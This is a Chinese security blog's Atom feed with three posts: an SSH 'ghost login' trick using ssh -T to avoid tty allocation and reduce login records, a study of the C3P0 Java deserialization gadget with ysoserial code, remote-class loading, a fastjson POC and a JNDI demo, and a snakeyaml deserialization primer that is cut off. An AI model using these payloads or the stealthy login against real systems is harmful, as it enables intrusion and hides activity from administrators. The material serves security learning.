<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>h0ld1rs的博客</title>
  
  <subtitle>浊眼之外，满目皆是狼藉</subtitle>
  <link href="https://h0ld1rs.github.io/atom.xml" rel="self"/>
  
  <link href="https://h0ld1rs.github.io/"/>
  <updated>2022-04-29T03:38:16.247Z</updated>
  <id>https://h0ld1rs.github.io/</id>
  
  <author>
    <name>h0ld1rs</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ssh幽灵登录</title>
    <link href="https://h0ld1rs.github.io/posts/19442.html"/>
    <id>https://h0ld1rs.github.io/posts/19442.html</id>
    <published>2022-04-26T10:07:38.000Z</published>
    <updated>2022-04-29T03:38:16.247Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssh-幽灵登录"><a href="#ssh-幽灵登录" class="headerlink" title="ssh 幽灵登录"></a>ssh 幽灵登录</h1><h2 id="ssh-T"><a href="#ssh-T" class="headerlink" title="ssh -T"></a>ssh -T</h2><p>在逛hackingclub的时候，逛到了<code>ssh -T</code>这么一说，主要命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@IP /bin/bash -i</span><br></pre></td></tr></table></figure><blockquote><p>w和last，只能发现完整的tty交互式终端，而上述命令并不会分配一个真正的tty，仅仅是调用了&#x2F;bin&#x2F;bash而已</p></blockquote><p>进行一个交互，当我想通过<code>ssh --help</code>的时候，没有找到，然后听师傅们说，使用man 查一下手册，就可以看到</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220426181828.png"></p><p>-T的意思是强制不分配伪终端，这里就开始找伪终端是什么，，</p><blockquote><p>伪终端（Pseudo Terminal）是成对的逻辑终端设备，例如&#x2F;dev&#x2F;ptyp3和&#x2F;dev&#x2F;ttyp3（或着在设备文件系统中分别是&#x2F;dev&#x2F;pty&#x2F;m3和 &#x2F;dev&#x2F;pty&#x2F;s3）。它们与实际物理设备并不直接相关。如果一个程序把ttyp3看作是一个串行端口设备，则它对该端口的读&#x2F;写操作会反映在该逻辑终端设备对的另一个上面（ttyp3）。而ttyp3则是另一个程序用于读写操作的逻辑设备。这样，两个程序就可以通过这种逻辑设备进行互相交流，而其中一个使用ttyp3的程序则认为自己正在与一个串行端口进行通信。这很象是逻辑设备对之间的管道操作。</p></blockquote><p>这里还有个串行终端，伪终端会把收到的数据通过接口传给串行终端。之所以不分配，我感觉是因为这样的情况下还是可以存在日志记录的，不分配的话，应该是可以减少一些记录的。毕竟隐匿才是关键的部分。</p><p>具体细节可以看这几个师傅的文章：</p><p><a href="https://blog.csdn.net/chdhust/article/details/8495921">https://blog.csdn.net/chdhust/article/details/8495921</a></p><p><a href="https://blog.csdn.net/dou_hua_hua/article/details/108382514">https://blog.csdn.net/dou_hua_hua/article/details/108382514</a></p><h2 id="联动"><a href="#联动" class="headerlink" title="联动"></a>联动</h2><p>这里 后面使用了 &#x2F;bin&#x2F;bash -i 进行交互，我尝试了一下不用bash,应该也是可以实现一些简单的命令执行，但是交互的体验不是很好。</p><p>如果要使用 bash的话，肯定会留下一些记录，所以我们接下来，需要清理一下日志记录。</p><h3 id="不记录ssh公钥在本地-ssh目录中"><a href="#不记录ssh公钥在本地-ssh目录中" class="headerlink" title="不记录ssh公钥在本地.ssh目录中"></a>不记录ssh公钥在本地.ssh目录中</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=/dev/null -T root@IP /bin/bash -i</span><br></pre></td></tr></table></figure><p>这里参考师傅的文章</p><p><a href="http://blog.chinaunix.net/uid-20367477-id-4242526.html">http://blog.chinaunix.net/uid-20367477-id-4242526.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220426190810.png"></p>]]></content>
    
    
    <summary type="html">逛hackingclub得时候，发现有个师傅发了个ssh 登录得例子</summary>
    
    
    
    <category term="红队" scheme="https://h0ld1rs.github.io/categories/%E7%BA%A2%E9%98%9F/"/>
    
    
    <category term="攻击, 登录" scheme="https://h0ld1rs.github.io/tags/%E6%94%BB%E5%87%BB-%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>C3P0反序列化链学习</title>
    <link href="https://h0ld1rs.github.io/posts/32491.html"/>
    <id>https://h0ld1rs.github.io/posts/32491.html</id>
    <published>2022-04-22T04:40:54.000Z</published>
    <updated>2022-04-29T03:57:47.131Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C3P0反序列化链学习"><a href="#C3P0反序列化链学习" class="headerlink" title="C3P0反序列化链学习"></a>C3P0反序列化链学习</h1><h2 id="依赖包"><a href="#依赖包" class="headerlink" title="依赖包"></a>依赖包</h2><p>需要先导入依赖包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>C3P0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mchange-commons-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.2.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>依赖包的查看<code>ysoserial</code>可以发现，需要用到的依赖包</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220422141901.png"></p><h2 id="C3P0的利用方式"><a href="#C3P0的利用方式" class="headerlink" title="C3P0的利用方式"></a>C3P0的利用方式</h2><p>现在有三种利用方式：</p><ul><li>http base</li><li>JNDI</li><li>Hex序列化字节加载器</li></ul><p>在原生的反序列化中，如果找不到其他的链，则可以尝试C3P去加载远程执行的类进行命令执行。JNDI则适用于<code>jackSon</code>等利用，而Hex 序列化字节加载器的方式可以利用与<code>fastjson</code>或者<code>JackSon</code>等不出网的情况下进行利用。</p><h3 id="HTTP-Base"><a href="#HTTP-Base" class="headerlink" title="HTTP Base"></a>HTTP Base</h3><p>将<code>ysoserial</code>作为<code>lib</code>包导入，做以下<code>payload</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ysoserial.Serializer;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.C3P0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// PayloadRunner.run(C3P0.class, args);</span></span><br><span class="line">        <span class="type">C3P0</span> <span class="variable">c3P0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P0</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> c3P0.getObject(<span class="string">&quot;http://127.0.0.1:8000/:test&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] serialize = Serializer.serialize(object);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意类名不要直接命名为Test或者test，否则payload会直接无法执行</p></blockquote><p>同时需要在公网服务器下放置一个恶意的类：<code>test</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来进行一个调试，在<code>C3P0.getObject()</code>处打上一个断点开始调试：</p><p>其中的定义是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220422161308.png"></p><p>将 <code>command</code>使用<code>lastIndexOf</code>获取<code>ASCLL</code>码为58的字符</p><p>正好，<code>ASCLL</code>码58为冒号：<code>:</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220422161004.png"></p><p>之后获得<code>className</code>，远程加载的恶意类为<code>test</code></p><p>之后通过反射创建了一个<code>PoolBackedDataSource</code>对象，接着，又用反射设置<code>PoolBackedDataSourceBase</code>类中属性<code>connectionPoolDataSource</code>为<code>PoolSource</code>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflections.getField(PoolBackedDataSourceBase.class, <span class="string">&quot;connectionPoolDataSource&quot;</span>).set(b, <span class="keyword">new</span> <span class="title class_">PoolSource</span>(className, url));</span><br></pre></td></tr></table></figure><p>在实例化的时候，会自动进行赋值</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220422163519.png"></p><p>之后进行序列化的时候，会调用<code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#writeObject()</code>方法，但是会抛出异常进入<code>catch</code>部分，原因是我们传入的<code>this.connectionPoolDataSource</code>，即<code>PoolSource</code>类是不可被序列化的。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220422174628.png"></p><p>因为<code>PoolSource</code>继承了<code>final</code>关键字段</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220422180046.png"></p><p>之后继续往下走，会到了</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220422181018.png"></p><p>他会调用传递的<code>this.connectionPoolDataSource</code>的<code>getReference</code>方法来获取一个<code>Reference</code>，这就是我们为什么要重写这个方法。</p><p>往下走，将获得的<code>reference</code>放进去</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220422181411.png"></p><h3 id="Hex序列化字节加载器"><a href="#Hex序列化字节加载器" class="headerlink" title="Hex序列化字节加载器"></a>Hex序列化字节加载器</h3><p>这里其实就是常听到的就是用C3P0二次反序列化打<code>Fastjson</code>，因为像Fastjson和Jackson在反序列化时都会触发setter方法的执行，而C3P0中<code>userOverridesAsString</code>的setter会将<code>HexAsciiSerializedMap</code>开头的hex字符串进行解码再去触发Java原生的反序列化。</p><p>&#x3D;&#x3D;当目标存在其他的依赖，如fastjson或者jackson等，而且不出网，则适合使用这个<code>Gadget</code>&#x3D;&#x3D;</p><p>先生成序列化payload，这里的payload注意是需要本地的另一条Gadget比如CC或者CB链，这里以CC2为例</p><p><code>java -jar ysoserial.jar CommonsCollections2 &quot;calc.exe&quot; &gt; test.ser</code></p><p>编写如下demo生成hex数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;src/main/resources/test.ser&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] data = toByteArray(in);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">HexString</span> <span class="operator">=</span> bytesToHexString(data, data.length);</span><br><span class="line">        System.out.println(HexString);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] bArray, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sTemp</span> <span class="operator">=</span> Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到如下：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220426161020.png"></p><p>当链是<code>fastjson</code>的时候， POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;e&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&#125;,<span class="string">&quot;f&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>,<span class="string">&quot;userOverridesAsString&quot;</span>:<span class="string">&quot;HexAsciiSerializedMap:hex编码内容;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>使用的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, PropertyVetoException, SQLException &#123;</span><br><span class="line">        <span class="type">JndiRefConnectionPoolDataSource</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JndiRefConnectionPoolDataSource</span>();</span><br><span class="line">        exp.setJndiName(<span class="string">&quot;ldap://127.0.0.1:1389/test&quot;</span>);</span><br><span class="line">        exp.setLoginTimeout(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">在学习snakeyaml的时候，里面有个C3P0的链子，，，学习一下</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java" scheme="https://h0ld1rs.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>snakeyaml学习</title>
    <link href="https://h0ld1rs.github.io/posts/42979.html"/>
    <id>https://h0ld1rs.github.io/posts/42979.html</id>
    <published>2022-04-21T10:31:18.000Z</published>
    <updated>2022-04-22T06:11:03.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="snakeyaml-学习"><a href="#snakeyaml-学习" class="headerlink" title="snakeyaml 学习"></a>snakeyaml 学习</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>感觉和 fastjson 一样，是把对象转换成<code>yaml</code>格式的一种手段</p><h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><p>添加依赖：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;dependency&gt;</span></span><br><span class="line">          <span class="string">&lt;groupId&gt;org.yaml&lt;/groupId&gt;</span></span><br><span class="line">          <span class="string">&lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;</span></span><br><span class="line">          <span class="string">&lt;version&gt;1.16&lt;/version&gt;</span></span><br><span class="line">      <span class="string">&lt;/dependency&gt;</span></span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>测试demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.user.User;</span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 序列化测试</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">20</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">dump1</span> <span class="operator">=</span> yaml1.dump(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;snakeyaml序列化测试：&quot;</span>);</span><br><span class="line">        System.out.println(dump1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化测试</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">dump2</span> <span class="operator">=</span> <span class="string">&quot;!!com.user.User &#123;age: 30, name: admin&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">load</span> <span class="operator">=</span> yaml2.load(dump2);</span><br><span class="line">        System.out.println(<span class="string">&quot;snakeyaml反序列化测试：&quot;</span>);</span><br><span class="line">        System.out.println(load.getClass());</span><br><span class="line">        System.out.println(load);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="snakeyaml的反序列化的方式"><a href="#snakeyaml的反序列化的方式" class="headerlink" title="snakeyaml的反序列化的方式"></a>snakeyaml的反序列化的方式</h1><ol><li><p>无构造函数和set函数情况下 snakeyaml 将使用反射的方式自动赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.TestA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModelA</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> a;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，我们并没有赋值，我们使用yaml对其进行赋值试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.TestA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModelATest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">ModelA</span> <span class="variable">a</span> <span class="operator">=</span> (ModelA) yaml.load(<span class="string">&quot;!!com.TestA.ModelA &#123;a : 5,b : 0&#125;&quot;</span>);</span><br><span class="line">        System.out.println(yaml.dump(a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，赋值还是可以的</p><blockquote><p>默认情况下，yaml的<code>load（）</code>方法返回一个<code>Map</code>对象。查询<code>Map</code>对象时，我们需要事先知道属性键的名称，否则容易出错。更好的办法是自定义类型。而<strong>这里”!!”用于强制类型转化，”!!com.TestA.ModelA”是使用全限定类名将该对象转为ModelA类，如果没有”!”则就是个key为字符串的Map</strong>：</p></blockquote></li><li><p>有构造函数</p><p>声明一个B类，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.TestB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModelB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> a;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ModelB</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.a = 